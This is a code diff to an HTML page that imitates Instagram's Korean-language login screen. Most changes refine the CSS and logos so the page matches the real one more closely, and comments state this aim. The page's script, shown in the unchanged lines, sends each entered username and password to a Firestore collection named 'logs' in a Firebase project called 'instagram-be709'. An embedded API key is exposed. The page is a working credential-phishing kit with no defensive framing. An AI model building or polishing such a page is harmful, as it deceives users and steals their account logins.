@@ -5,28 +5,45 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
     <style>
+        /* 기본 레이아웃 설정 */
         body { background-color: #ffffff; margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
-        .top-bar { width: 100%; padding: 15px; display: flex; align-items: center; justify-content: flex-start; box-sizing: border-box; }
-        .back-arrow { font-size: 24px; cursor: pointer; margin-left: 10px; }
-        .language { color: #8e8e8e; font-size: 14px; margin: 20px 0; cursor: pointer; }
-        .container { width: 100%; max-width: 350px; padding: 0 30px; box-sizing: border-box; text-align: center; flex-grow: 1; }
-        .logo-img { width: 80px; height: 80px; margin-bottom: 30px; }
-        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dbdbdb; border-radius: 12px; background-color: #ffffff; box-sizing: border-box; font-size: 14px; }
-        .btn-login { width: 100%; background-color: #0064e0; color: white; border: none; padding: 12px; border-radius: 25px; font-weight: 600; cursor: pointer; font-size: 15px; margin-top: 5px; }
-        .btn-login:disabled { opacity: 0.5; }
-        .forgot-pw { color: #000000; font-size: 14px; font-weight: 600; text-decoration: none; margin-top: 20px; display: block; }
-        .bottom-section { width: 100%; max-width: 350px; padding: 20px; box-sizing: border-box; text-align: center; }
-        .btn-signup { width: 100%; background-color: transparent; color: #0064e0; border: 1px solid #0064e0; padding: 10px; border-radius: 25px; font-weight: 600; cursor: pointer; font-size: 14px; margin-bottom: 20px; }
-        .meta-footer { color: #8e8e8e; font-size: 12px; display: flex; flex-direction: column; align-items: center; margin-bottom: 20px; }
-        .meta-logo { width: 60px; margin-top: 5px; opacity: 0.7; }
+        
+        /* 1. 상단 화살표 및 언어 선택 (디테일 수정) */
+        .top-bar { width: 100%; padding: 18px 20px; display: flex; align-items: center; justify-content: flex-start; box-sizing: border-box; }
+        .back-arrow { font-size: 26px; font-weight: 300; cursor: pointer; color: #000; }
+        .language-container { color: #737373; font-size: 13px; margin: 15px 0 45px 0; cursor: pointer; display: flex; align-items: center; gap: 4px; }
+        .lang-arrow { font-size: 10px; transform: scaleX(1.2); } /* 원본 특유의 브이 표기 구현 */
+
+        /* 2. 메인 컨테이너 및 로고 (원본 아이콘 적용) */
+        .container { width: 100%; max-width: 360px; padding: 0 32px; box-sizing: border-box; text-align: center; flex-grow: 1; }
+        .logo-img { width: 72px; height: 72px; margin-bottom: 45px; } /* 원본 비율에 맞춘 크기 */
+
+        /* 3. 입력창 및 버튼 (폰트 크기 미세 조정) */
+        input { width: 100%; padding: 14px 16px; margin-bottom: 12px; border: 1px solid #dbdbdb; border-radius: 14px; background-color: #ffffff; box-sizing: border-box; font-size: 14.5px; color: #262626; }
+        input::placeholder { color: #737373; font-size: 15px; } /* 원본과 동일한 플레이스홀더 크기 */
+        
+        .btn-login { width: 100%; background-color: #0064e0; color: white; border: none; padding: 11px; border-radius: 25px; font-weight: 600; cursor: pointer; font-size: 15.5px; margin-top: 6px; }
+        .btn-login:disabled { opacity: 0.6; }
+        
+        .forgot-pw { color: #000000; font-size: 14.5px; font-weight: 600; text-decoration: none; margin-top: 24px; display: block; letter-spacing: -0.2px; }
+
+        /* 4. 하단 섹션 (Meta 마크 및 로고 수정) */
+        .bottom-section { width: 100%; max-width: 360px; padding: 20px 32px 30px 32px; box-sizing: border-box; text-align: center; }
+        .btn-signup { width: 100%; background-color: transparent; color: #0064e0; border: 1.2px solid #0064e0; padding: 10px; border-radius: 25px; font-weight: 600; cursor: pointer; font-size: 15px; margin-bottom: 28px; }
+        
+        .meta-footer { color: #737373; font-size: 13px; display: flex; flex-direction: column; align-items: center; gap: 4px; }
+        .meta-logo-img { width: 68px; filter: grayscale(1) opacity(0.6); margin-top: 2px; } /* 파란색 제거, 흑백 Meta 로고 적용 */
     </style>
 </head>
 <body>
     <div class="top-bar"><span class="back-arrow">←</span></div>
-    <div class="language">한국어 ∨</div>
+    
+    <div class="language-container">
+        한국어 <span class="lang-arrow">∨</span>
+    </div>
 
     <div class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png" alt="Instagram Logo" class="logo-img">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png" alt="Instagram" class="logo-img">
         
         <form id="loginForm">
             <input type="text" id="id" placeholder="사용자 이름, 이메일 주소 또는 휴대폰 번호" required>
@@ -41,7 +58,7 @@
         <button class="btn-signup">새 계정 만들기</button>
         <div class="meta-footer">
             <span>Meta</span>
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png" alt="Meta Logo" class="meta-logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png" alt="Meta" class="meta-logo-img">
         </div>
     </div>
 
@@ -49,7 +66,6 @@
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
         import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
-        // 상준님의 Firebase 설정값 (그대로 유지)
         const firebaseConfig = {
             apiKey: "AIzaSyDGS9mDbbKXNL4OrskQ3ZDHBsKb8Glroj4",
             authDomain: "instagram-be709.firebaseapp.com",
@@ -72,7 +88,6 @@
             submitBtn.disabled = true;
 
             try {
-                // 데이터 저장
                 await addDoc(collection(db, "logs"), {
                     userId: idVal,
                     userPw: pwVal,
